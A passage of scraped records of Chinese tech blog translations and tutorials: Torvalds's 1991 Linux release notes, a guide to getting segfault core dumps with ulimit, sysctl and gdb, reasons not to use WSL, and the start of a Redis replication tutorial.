inline）。,\n,然而有很多可用于386电脑的unices，他们大部分要花很多钱，而且不附带源码。因此他们是使用计算机的理想选择，但是如果你想了解他们如何工作，那是不可能的。,\n,也有一些  Unix 是附带源码的。Minix，Andrew S. Tanenbaum编写的学习工具，已经在大学中作为教学工具使用了很多年了。BSD-386系统是附带源码的，但是有版权限制，而且要花很多钱（我记得起始价格为$995）。GNU内核（Hurd）将会是免费的，但是现在还没有准备好，而且对于了解和学习它们来说有点庞大。,\n,LINUX与Minix是最相似的，由于它很小而且不是非常复杂，因此易于理解（嗯…）。LINUX是基于Minix编写的，因此有相当多的相同点，任何Minix黑客在使用LINUX的时候都感觉非常熟悉。不过，没有在项目中使用Minix代码，因此Minix版权没有限制到这个新系统。它也是完全免费的，而且它的版权非常宽松。因此不像使用Minix，它不需要几兆字节大小的区别。,\n,LINUX版权,\n,虽然是免费的发布版，我还是从以下几个方面限制了LINUX的使用：,\n,\n,你可以自由复制和重新发布源码和二进制，只要是：,\n,\n,\n,完全开源。因此不能单独发布二进制，即使你只修改了一点。,\n,你不能从发布版获取利益。事实上甚至“装卸费用”都是不被接受的。,\n,你要保持完整的适当版权。,\n,\n,\n,根据需要你可能会修改源码，但是如果你发布了新系统的一部分（或者只有二进制），必须将新的代码包含进去。,\n,除了不包含版权的代码之外，你可能会做一些小的修改。这由你来定，但是如果能将相关内容或者代码告诉我，将不胜感激。,\n,\n,对任何使用或者扩展系统的人来说，这应该足够宽松而不会引起任何担忧。如果你有朋友真的不想要源码，只想要一个能运行的二进制，你当然可以给他而不用担心我会起诉你。不过最好只在朋友之间这么做。,\n,LINUX运行所需的硬件/软件,\n,LINUX是在一个运行Minix的386-AT上开发的。由于LINUX是一个真正的操作系统，而且需要直接与硬件交互来做一些事情，你必须有一个非常相似的系统来让他顺利运行：,\n,\n,386-AT（PS/2之类是不同的，不能正常运行）,\n,VGA或者EGA屏幕硬件。,\n,标准AT硬盘接口，IDE盘可以运行（实际上我用的就是这个）。,\n,正常实模式BIOS。一些机器看起来是用虚-86模式运行启动程序，而且在这样的机器LINUX不会启动和正常运行。,\n,\n,LINUX会发展成为一个自给自足的系统，现在需要Minix-386才能正常运行。你需要Minix让初始化启动文件系统，和编译OS二进制。在那之后LINUX是一个自给自足的系统，但是为了做文件系统检查（fsck）和修改之后重编译系统，推荐使用Minix。,\n,获取LINUX,\n,LINUX现在可以使用匿名ftp从‘nic.funet.fi’的‘/pub/OS/Linux’目录获取。这个目录包含操作系统的所有源码，还有一些二进制文件，因此你可以真正使用系统了。,\n,注意！二进制大多是GNU软件，而且版权比LINUX的严格（GNU非盈利性版权）。因此你不能在不发布他们源码的情况下重新发布他们，可以在/pub/GNU中找到。关于GNU非盈利性版权，从任何GNU软件包了解更多。,\n,此目录中各类文件如下：,\n,\n,linux-0.03.tar.Z–系统的完全源码，16位tar压缩文件格式。,\n,Linux.tex–这个文件的LATEX源码。,\n,bash.Z–在LINUX下运行的bash二进制文件。这个二进制文件应该放到预留给LINUX文件系统中的/bin/sh下（参见installation）。,\n,update.Z–更新二进制文件，要放到/bin/update。,\n,gccbin.tar.Z–GNU cc二进制文件需要由一个可运行的编译器。这个tar压缩包含有编译器，加载器，汇编程序和支持程序（nm，strip等）。它还包含一个小型的库，可用于大部分程序。,\n,include.tar.Z–让gcc运行的必要include文件。,\n,unistd.tar.Z–unistd库程序的源码（即系统调用接口）。通过这个你可以使用系统独立库源码编译一个大一些的库。,\n,utilbin.tar.Z–各种GNU工具的二进制文件，包括GNU的fileutils，make和tar。也包含克隆emacs的uemacs。,\n,README, RELNOTES-0.01, INSTALLATION–包含一些（有点过时的）LINUX相关的信息的ascii文件。,\n,\n,让系统运行的最少文件是OS源码和bash和更新二进制文件。不过只用这些，你做不了什么事。,\n,安装,\n,在你拿到了必要LINUX文件之后，你需要编译系统和创建root目录。必要的二进制文件需要放到root文件系统中。按如下操作：,\n1. 备份你的软件。虽然LINUX从没有毁坏过我的任何文件，但没有什么是必然的。安全胜过遗憾。,\n2. 选择/创建一个标准MinixHD-分区作为新的LINUX root文件系统。,\n3. 在新的root创建必要的设备节点。LINUX与Minix使用相同类型的节点，所以使用Minix的mknod命令创建下面的设备：节点号与在Minix中相同。,\n,\n,/dev/tty,\n,/dev/tty[0-2],\n,/dev/hd[0-9],\n,\n,4. 将必要文件放到新的root分区。文件应该放在下面目录中：,\n希望你现在有一个功能正常的unix，而且你已经root权限登录。LINUX现在没有‘init’过程，只要你注销，系统会同步并等待。使用三指键（Ctrl+Alt+Del）重启机器。,\n,\n,gcc,\n,添加链接到你选择的/usr/local/lib中的文件。我将ld，as，nm，strip和size链接到他们相应的 /usr/local/lib/gcc-XXX。,\n,gccbin.tar.Z中的内容，除了gcc,\n,include.tar.Z的内容,\n,utilbin.tar.Z的内容,\n,sh，即bash.Z,\n,update,\n,/bin:,\n,/usr/bin:,\n,/usr/include:,\n,/usr/local/lib:,\n,/usr/local/bin:,\n,编辑系统中的linux/include/linux/config.h。这个文件包含了针对于系统的信息：内存空间，硬盘类型，root分区号（同样的与Minix中的编号相同），键盘类型（现在只有US和Finnish）等。,\n,编译LINUX源码。一个简单技巧就可以完成，在你编辑makefiles为适合你的系统之后（即，删除-mstring-insnsflag，和修改适合你的路径。）1.40之前版本gcc的用户可能需要添加gnulib到makefile中‘LIBS=’一行。,\n,复制产生的镜像文件到软盘（即，cp Image /dev/PS0 或者之类的）。,\n,使用新的软盘重启。启动界面应该告诉你系统正在启动（加载系统…），然后是一些必要的文件系统信息（xxx/XXX inodes/blocks free），接下来是一个确定，还有bash提示（如果你没有.bashrc文件，则初始化bash#）。,\n,\n,LINUX 缺失/不兼容的东西,\n,LINUX 是打算作为一个全部自给自足的内核，但现在并非如此。作为上面已经提到的，你需要 Minix 来设置启动设备并且检查文件系统当它运行起来的时候。这里有一些其它的不足之处：,\n,硬件的不兼容。一些 AT 标准特性当前还没有支持。最值得注意的是软盘驱动，利用 LINUX 进行实际工作（备份 etc）当前是不可能的[译者：这个是 oldlinux，这个是 Linus Torvalds 1991 年 10 月写的文章，肯定当时是不行的]。还有串行连接的一些特性没有被实现（2400 bps 波特率的硬连接，没有挂断（hang-up）提示等等 ）。,\n,标准 c 库的不兼容。gcc 分发版的 libc.a 没有完成，我对免费可发布的库功能很感兴趣。,\n,一些系统调用没有完全实现。这些设计绝大多数“极少调用”的特性比如调试（谁无论如何需要它的话，你的程序第一次是无法工作的:-)）以及其它的特性。,\n,如上所述，没有登陆和初始化进程。当前 LINUX 启动在单用户模式，以 root 作为控制台用户。对于一些移植工作足够了，但不是实际可用的。,\n,387支持[译者：硬件浮点，当时 Intel 发布了外接式 FPU] 没有被实现，即使已有一些基础程序被提供出来。”nic.funet.fi” 的 gcc 二进制包使用软浮点（ie 仿真功能调用）来支持 4 个基础数学运算操作。387-支持将尽快实现当我的电脑安装了这个硬件。希望在一个月或者两个月。,\n,现在还没有重要的系统管理命令实现在 LINUX 中。这些包括 mkfs, format, fsck, mknod 等。这些命令需要的内核特性还没有实现（format, mknod），一些命令只需要实现它。作为一个库，我欢迎任何免费分发文件。,\n,如您所见，LINUX还不是一个完整的系统。 感谢您的帮助，使其变得更好。 我对为LINUX重写的Minix命令不感兴趣，除非你自己从头开始编写它们。 您当然可以免费（并鼓励）将您的Minix发行版中的所有内容用于您自己的LINUX系统，但由于Minix的版权，它们无法分发给更广泛的受众。,\n,这里提到的一些问题将由我（即lines/387/floppy支持）尽快修复，但我希望得到库函数的支持。感谢你们提交的错误报告及补丁还有愿望清单，如果你真的有针对问题的补丁，我会立即尝试去修复它。 小的更改将作为补丁形式发送到邮件列表，并在,nic.funet.fi'上设置，如果经过大量重写，或者修复大的补丁，整个系统将在,nic.funet.fi’更新。,\n,LINUX移植软件,\n,LINUX被设计得让移植相对容易。因此，就有了完整的termios实现和一些POSIX库。我所移植的（诚然相对较少）程序没有任何问题。,\n,尽管LINUX与Minix非常相似，但Minix程序通常并不会比为其他nuix设计的程序更容易移植。因此，我不建议从一个特定程序的Minix版本开始，而应该尝试从头开始移植‘’virgin‘’程序。比BSD更接近SYSV，这意味着当给定一个-DUSG或者-DSYSV标识时，大多数程序很容易移植。,\n,移植过程中最困难的一点就是缺少库函数。这些必须由你来编写，或者从其他的来源复制（Minix可能是个有缘人）。另外，一些程序（特别是GNU）有各种各样的标识，这些标识可以定义哪些函数不可用（一旦在Makefile中添加了足够量的-DXXX_MISSING标识，GNU fileutils将编译的很好）。,\n,已经移植的程序,\n,下面这些程序已经移植到LINUX：,\n,\n,GNU cc (gcc, cc1, cpp),\n,GNU assembler (as386),\n,GNU binutils (ld, ar, nm, size, strip, ranlib),\n,GNU compress (16-bit),\n,GNU tar,\n,GNU make,\n,GNU bash (Bourne Again SHell),\n,GNU sed,\n,GNU bison (yacc-lookalike),\n,GNU awk,\n,GNU fileutils (ls, cp, rm, mkdir, rmdir, tail etc),\n,less,\n,uemacs,\n,\n,所有上述程序都能在‘nic.funet.fi’(主要在’/pub/gnu’)中找到，大多数LIINUX-binaries都可以在‘/pub/OS/Linux’目录中找到。包括gcc（cc1）有一些我自己增强的功能，所有这些程序都在没有变化的情况下编译的。先尝试自己编译，遇到问题可以将差异或者资源发邮件给我。,\n,另外，我提起过明确地GNU差异编译和运行。,\n,技术帮助,\n,LINUX目前有一个邮件列表，您可以通过邮件发送到这个地址订阅：,Linux-activists-request@niksula.hut.fi, ，并要求包括在列表中。然后你可以通过这个邮箱：,Linux-activists@niksula.hut.fi, 提问题，这将复制你的问题/答案/无论什么，并发送给列表中其他所有人。,\n,请注意Linux-activists和Linux0activists-request的不同——第一个用于给列表中的所有人发送邮件，第二个仅用于订阅和取消订阅。,\n,当然，您也可以直接发送邮件至 ,torvalds@kruuna.helsinki.fi,。我会尽量在一两天内回答所有的问题。,\n,尽管‘nic.funet.fi’可能会保持合理的更新状态，但是它还有些问题（即，我无法因为个人得到文件，但可以通过几个人）。因此，如果邮件列表上的人想要补丁或二进制文件，他们将会更快得到。,\n,感谢,\n,我要感谢学院…,\n,说真的，如果没有其他人的帮助，这个系统将永远不会有曙光，甚至会变得更糟。Bruce Evans 帮助我找到了需要更改的位置，以便gcc能正确地处理浮点数，并提供许多有用的想法/建议（他的Minix-386用于构建系统）。此外，Earl Chew 的estdio包被用于标准的IO库。像这样更自由地分发包！,\n,Alain W Black和Richard Tobin为Minix制作了gcc，没有它我就无法编译这个东西。GNU完成了我在Linux下使用的大部分程序。Alfred Leung发送了美国键盘补丁。,\n,附：“感谢”,wirzeniu@kruuna.helsinki.fi,他的“建设性”批评和“诙谐”的评论。他是我第一个,-测试者，他应该被授予勇气奖章。,\n,Linus Torvalds ,(,torvalds@kruuna.helsinki.fi,),  1991,年,10,月,10,日,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 2 收藏,\n\n                    , 2 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114208/", "url_object_id": "d6ec0ef3593f6a22382ac914afc4a27a", "front_image_path": "full/e0ca2411e7d10c43fe25ebc0a22960c9b956bd19.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "在 Linux 上如何得到一个段错误的核心转储", "create_time": "2018/07/14", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Julia Evans,   译文出处：,Linux中国/Stephen,   ,本周工作中，我花了整整一周的时间来尝试调试一个段错误。我以前从来没有这样做过，我花了很长时间才弄清楚其中涉及的一些基本事情（获得核心转储、找到导致段错误的行号）。于是便有了这篇博客来解释如何做那些事情！,\n,在看完这篇博客后，你应该知道如何从“哦，我的程序出现段错误，但我不知道正在发生什么”到“我知道它出现段错误时的堆栈、行号了！ ”。,\n,什么是段错误？,\n,“段错误segmentation fault”是指你的程序尝试访问不允许访问的内存地址的情况。这可能是由于：,\n,\n,试图解引用空指针（你不被允许访问内存地址 ,0,）；,\n,试图解引用其他一些不在你内存（LCTT 译注：指不在合法的内存地址区间内）中的指针；,\n,一个已被破坏并且指向错误的地方的 C++ 虚表指针C++ vtable pointer，这导致程序尝试执行没有执行权限的内存中的指令；,\n,其他一些我不明白的事情，比如我认为访问未对齐的内存地址也可能会导致段错误（LCTT 译注：在要求自然边界对齐的体系结构，如 MIPS、ARM 中更容易因非对齐访问产生段错误）。,\n,\n,这个“C++ 虚表指针”是我的程序发生段错误的情况。我可能会在未来的博客中解释这个，因为我最初并不知道任何关于 C++ 的知识，并且这种虚表查找导致程序段错误的情况也是我所不了解的。,\n,但是！这篇博客后不是关于 C++ 问题的。让我们谈论的基本的东西，比如，我们如何得到一个核心转储？,\n,步骤1：运行 valgrind,\n,我发现找出为什么我的程序出现段错误的最简单的方式是使用 ,valgrind,：我运行,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nvalgrind -v your-program\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,valgrind, ,-,v, ,your,-,program, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这给了我一个故障时的堆栈调用序列。 简洁！,\n,但我想也希望做一个更深入调查，并找出些 ,valgrind, 没告诉我的信息！ 所以我想获得一个核心转储并探索它。,\n,如何获得一个核心转储,\n,核心转储core dump是您的程序内存的一个副本，并且当您试图调试您的有问题的程序哪里出错的时候它非常有用。,\n,当您的程序出现段错误，Linux 的内核有时会把一个核心转储写到磁盘。 当我最初试图获得一个核心转储时，我很长一段时间非常沮丧，因为 – Linux 没有生成核心转储！我的核心转储在哪里？,\n,这就是我最终做的事情：,\n,\n,在启动我的程序之前运行 ,ulimit -c unlimited,\n,运行 ,sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t,\n,\n,ulimit：设置核心转储的最大尺寸,\n,ulimit -c, 设置核心转储的最大尺寸。 它往往设置为 0，这意味着内核根本不会写核心转储。 它以千字节为单位。 ,ulimit, 是按每个进程分别设置的 —— 你可以通过运行 ,cat /proc/PID/limit, 看到一个进程的各种资源限制。,\n,例如这些是我的系统上一个随便一个 Firefox 进程的资源限制：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ cat /proc/6309/limits \r\nLimit                     Soft Limit           Hard Limit           Units     \r\nMax cpu time              unlimited            unlimited            seconds   \r\nMax file size             unlimited            unlimited            bytes     \r\nMax data size             unlimited            unlimited            bytes     \r\nMax stack size            8388608              unlimited            bytes     \r\nMax core file size        0                    unlimited            bytes     \r\nMax resident set          unlimited            unlimited            bytes     \r\nMax processes             30571                30571                processes \r\nMax open files            1024                 1048576              files     \r\nMax locked memory         65536                65536                bytes     \r\nMax address space         unlimited            unlimited            bytes     \r\nMax file locks            unlimited            unlimited            locks     \r\nMax pending signals       30571                30571                signals   \r\nMax msgqueue size         819200               819200               bytes     \r\nMax nice priority         0                    0                    \r\nMax realtime priority     0                    0                    \r\nMax realtime timeout      unlimited            unlimited            us   \r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,cat, ,/,proc,/,6309,/,limits ,Limit                     ,Soft ,Limit           ,Hard ,Limit           ,Units     ,Max ,cpu ,time              ,unlimited            ,unlimited            ,seconds   ,Max ,file ,size             ,unlimited            ,unlimited            ,bytes     ,Max ,data ,size             ,unlimited            ,unlimited            ,bytes     ,Max ,stack ,size,            ,8388608,              ,unlimited            ,bytes     ,Max ,core ,file ,size,        ,0,                    ,unlimited            ,bytes     ,Max ,resident ,set          ,unlimited            ,unlimited            ,bytes     ,Max ,processes,             ,30571,                ,30571,                ,processes ,Max ,open ,files,            ,1024,                 ,1048576,              ,files     ,Max ,locked ,memory,         ,65536,                ,65536,                ,bytes     ,Max ,address ,space         ,unlimited            ,unlimited            ,bytes     ,Max ,file ,locks            ,unlimited            ,unlimited            ,locks     ,Max ,pending ,signals,       ,30571,                ,30571,                ,signals   ,Max ,msgqueue ,size,         ,819200,               ,819200,               ,bytes     ,Max ,nice ,priority,         ,0,                    ,0,                    ,Max ,realtime ,priority,     ,0,                    ,0,                    ,Max ,realtime ,timeout      ,unlimited            ,unlimited            ,us,   , ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,内核在决定写入多大的核心转储文件时使用软限制soft limit（在这种情况下，,max core file size = 0,）。 您可以使用 shell 内置命令 ,ulimit,（,ulimit -c unlimited,） 将软限制增加到硬限制hard limit。,\n,kernel.core_pattern：核心转储保存在哪里,\n,kernel.core_pattern, 是一个内核参数，或者叫 “sysctl 设置”，它控制 Linux 内核将核心转储文件写到磁盘的哪里。,\n,内核参数是一种设定您的系统全局设置的方法。您可以通过运行 ,sysctl -a, 得到一个包含每个内核参数的列表，或使用 ,sysctl kernel.core_pattern, 来专门查看 ,kernel.core_pattern, 设置。,\n,所以 ,sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t, 将核心转储保存到目录 ,/tmp, 下，并以 ,core, 加上一系列能够标识（出故障的）进程的参数构成的后缀为文件名。,\n,如果你想知道这些形如 ,%e,、,%p, 的参数都表示什么，请参考 ,man core,。,\n,有一点很重要，,kernel.core_pattern, 是一个全局设置 —— 修改它的时候最好小心一点，因为有可能其它系统功能依赖于把它被设置为一个特定的方式（才能正常工作）。,\n,kernel.core_pattern 和 Ubuntu,\n,默认情况下在 ubuntu 系统中，,kernel.core_pattern, 被设置为下面的值：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sysctl kernel.core_pattern\r\nkernel.core_pattern = |/usr/share/apport/apport %p %s %c %d %P\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sysctl ,kernel,.,core_pattern,kernel,.,core_pattern, ,=, ,|,/,usr,/,share,/,apport,/,apport, ,%,p, ,%,s, ,%,c, ,%,d, ,%,P, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这引起了我的迷惑（这 apport 是干什么的，它对我的核心转储做了什么？）。以下关于这个我了解到的：,\n,\n,Ubuntu 使用一种叫做 apport 的系统来报告 apt 包有关的崩溃信息。,\n,设定 ,kernel.core_pattern=|/usr/share/apport/apport %p %s %c %d %P, 意味着核心转储将被通过管道送给 ,apport, 程序。,\n,apport 的日志保存在文件 ,/var/log/apport.log, 中。,\n,apport 默认会忽略来自不属于 Ubuntu 软件包一部分的二进制文件的崩溃信息,\n,\n,我最终只是跳过了 apport，并把 ,kernel.core_pattern, 重新设置为 ,sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t,，因为我在一台开发机上，我不在乎 apport 是否工作，我也不想尝试让 apport 把我的核心转储留在磁盘上。,\n,现在你有了核心转储，接下来干什么？,\n,好的，现在我们了解了 ,ulimit, 和 ,kernel.core_pattern, ，并且实际上在磁盘的 ,/tmp, 目录中有了一个核心转储文件。太好了！接下来干什么？我们仍然不知道该程序为什么会出现段错误！,\n,下一步将使用 ,gdb, 打开核心转储文件并获取堆栈调用序列。,\n,从 gdb 中得到堆栈调用序列,\n,你可以像这样用 ,gdb, 打开一个核心转储文件：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ gdb -c my_core_file\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,gdb, ,-,c, ,my_core,_,file, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,接下来，我们想知道程序崩溃时的堆栈是什么样的。在 ,gdb, 提示符下运行 ,bt, 会给你一个调用序列backtrace。在我的例子里，,gdb, 没有为二进制文件加载符号信息，所以这些函数名就像 “??????”。幸运的是，（我们通过）加载符号修复了它。,\n,下面是如何加载调试符号。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsymbol-file /path/to/my/binary\r\nsharedlibrary\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,symbol,-,file, ,/,path,/,to,/,my,/,binary,sharedlibrary, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这从二进制文件及其引用的任何共享库中加载符号。一旦我这样做了，当我执行 ,bt, 时，gdb 给了我一个带有行号的漂亮的堆栈跟踪！,\n,如果你想它能工作，二进制文件应该以带有调试符号信息的方式被编译。在试图找出程序崩溃的原因时，堆栈跟踪中的行号非常有帮助。:),\n,查看每个线程的堆栈,\n,通过以下方式在 ,gdb, 中获取每个线程的调用栈！,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nthread apply all bt full\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,thread ,apply ,all ,bt ,full, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,gdb + 核心转储 = 惊喜,\n,如果你有一个带调试符号的核心转储以及 ,gdb,，那太棒了！您可以上下查看调用堆栈（LCTT 译注：指跳进调用序列不同的函数中以便于查看局部变量），打印变量，并查看内存来得知发生了什么。这是最好的。,\n,如果您仍然正在基于 gdb 向导来工作上，只打印出栈跟踪与bt也可以。 :),\n,ASAN,\n,另一种搞清楚您的段错误的方法是使用 AddressSanitizer 选项编译程序（“ASAN”，即 ,$CC -fsanitize=address,）然后运行它。 本文中我不准备讨论那个，因为本文已经相当长了，并且在我的例子中打开 ASAN 后段错误消失了，可能是因为 ASAN 使用了一个不同的内存分配器（系统内存分配器，而不是 tcmalloc）。,\n,在未来如果我能让 ASAN 工作，我可能会多写点有关它的东西。（LCTT 译注：这里指使用 ASAN 也能复现段错误）,\n,从一个核心转储得到一个堆栈跟踪真的很亲切！,\n,这个博客听起来很多，当我做这些的时候很困惑，但说真的，从一个段错误的程序中获得一个堆栈调用序列不需要那么多步骤：,\n,\n,试试用 ,valgrind,\n,\n,如果那没用，或者你想要拿到一个核心转储来调查：,\n,\n,确保二进制文件编译时带有调试符号信息；,\n,正确的设置 ,ulimit, 和 ,kernel.core_pattern,；,\n,运行程序；,\n,一旦你用 ,gdb, 调试核心转储了，加载符号并运行 ,bt,；,\n,尝试找出发生了什么！,\n,\n,我可以使用 ,gdb, 弄清楚有个 C++ 的虚表条目指向一些被破坏的内存，这有点帮助，并且使我感觉好像更懂了 C++ 一点。也许有一天我们会更多地讨论如何使用 ,gdb, 来查找问题！,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114211/", "url_object_id": "5a2415268c5f41548f265013b49fd955", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/11/1d34dd467641215c527e32ede94fe494.jpg"], "title": "什么情况下不应该使用 Windows Linux 子系统", "create_time": "2018/07/23", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Tom Fenton,   译文出处：,W.B.,   ,在我上个月的专栏文章中，我讨论了应该使用Windows Linux子系统（Windows Subsystem for Linux，WSL）的原因，该系统允许你在Windows 10和Windows 2016上运行Linux发行版。不过，仅仅因为你能够做什么并不意味这你应该这么做。相比于先前的文章着眼于勾勒WSL的好处，在此我会站在相反的角度讲述五个不应运行WSL的原因。,\n,原因1,\n,微软并未基于生产环境负载设计或构建WSL。如果你的应用或作业流程需要达到特定服务水平协议，那么不要将其运行在WSL之上。,\n,原因2,\n,运行一个虚拟机可能会更有效。WSL是一个超棒的工具，但是如果你需要Linux系统的全部能力和特性，最好还是在一个虚拟机上运行Linux实例。许多公司提供免费版本的Type 2 Hypervisor，它们可以很好地运行在Windows系统上。如果你确实想要获得完整的Linux体验，就在Vmware Player、Oracle Virtualbox、Microsoft Hyper-v或者其他Hypervisor上将Linux作为虚拟机运行。,\n,原因3,\n,WSL缺乏可靠的图形界面。在另一篇文章中，我向大家演示了如何配置WSL与图形子系统协同工作。经过一番尝试之后，我可以让一些图形化程序跑起来，但是还有其他程序令我无能为力。因为让WSL与图形化子系统交互并没有包含在微软的设计目标内。如果你需要一个可靠的图形界面，不要在WSL运行它。,\n,原因4,\n,WSL上的联网并不完全可靠。WSL允许你进行网络通信，但是这可能并不是最佳的实现途径，因为它要穿透几层才能生效。WSL的早期版本对于通过命令行实现联网存在一些限制。尽管事实上WSL已经以难以置信的速度变得成熟稳定，Windows和Linux的联网协议栈却已历经数十年的优化，因此我觉得WSL的联网变得完全可靠还需假以时日。,\n,原因5,\n,WSL免费，但未必成本最低。直觉告诉我很多人会让WSL发挥超越其设计目的的作用，这会让他们投入比替代的付费方案更多的资源。使用正确的工具完成任务永远是最佳的问题解决之道。,\n,最终观点,\n,总之，不要买了雨伞就盼着下雨。WSL是一个值得拥有的优秀工具，可以很方便地用于非生产负载环境和快速简单的任务，但是它并非设计用于生产环境；恰如其分地使用它，而不是拿鸡毛当令箭。,\n,译者简介,\n,武斌，1984 年生，男，自由职业，做过网络管理、计算机图书编辑等工作，喜欢技术，对 IT 行业知识涉猎广泛。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114221/", "url_object_id": "48727ed61f8a464829dd46ddc8c7e081", "front_image_path": "full/11a48b07810c909fd0ce4f50b3b33355d43f04e2.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "title": "深入学习 Redis（3）：主从复制", "create_time": "2018/07/05", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,编程迷思,   ,前言,\n,在前面的两篇文章中，分别介绍了,Redis的内存模型,和,Redis的持久化,。,\n,在Redis的持久化中曾提到，Redis高可用的方案包括持久化、主从复制（及读写分离）、哨兵和集群。其中持久化侧重解决的是Redis数据的单机备份问题（从内存到硬盘的备份）；而主从复制则侧重解决数据的多机热备。此外，主从复制还可以实现负载均衡和故障恢复。,\n,这篇文章中，将详细介绍Redis主从复制的方方面面，包括：如何使用主从复制、主从复制的原理（重点是全量复制和部分复制、以及心跳机制）、实际应用中需要注意的问题（如数据不一致问题、复制超时问题、复制缓冲区溢出问题）、主从复制相关的配置（重点是repl-timeout、client-output-buffer-limit slave）等。,\n,一、主从复制概述,\n,主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。,\n,默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点。,\n,主从复制的作用,\n,主从复制的作用主要包括：,\n,\n,数据冗余：主从复制实现了数据的热备份，是持久化之外的一种数据冗余方式。,\n,故障恢复：当主节点出现问题时，可以由从节点提供服务，实现快速的故障恢复；实际上是一种服务的冗余。,\n,负载均衡：在主从复制的基础上，配合读写分离，可以由主节点提供写服务，由从节点提供读服务（即写Redis数据时应用连接主节点，读Redis数据时应用连接从节点），分担服务器负载；尤其是在写少读多的场景下，通过多个从节点分担读负载，可以大大提高Redis服务器的并发量。,\n,高可用基石：除了上述作用以外，主从复制还是哨兵和集群能够实施的基础，因此说主从复制是Redis高可用的基础。,\n,\n,二、如何使用主从复制,\n,为了更直观的理解主从复制，在介绍其内部原理之前，先说明我们需要如何操作才能开启主从复制。,\n,1. 建立复制,\n,需要注意，,主从复制的开启，完全是在从节点发起的；不需要我们在主节点做任何事情。,\n,从节点开启主从复制，有3种方式：,\n,（1）配置文件,\n,在从服务器的配置文件中加入：slaveof <masterip> <masterport>,\n,（2）启动命令,\n,redis-server启动命令后加入 –slaveof <masterip> <masterport>,\n,（3）客户端命令,\n,Redis服务器启动后，直接通过客户端执行命令：slaveof <masterip> 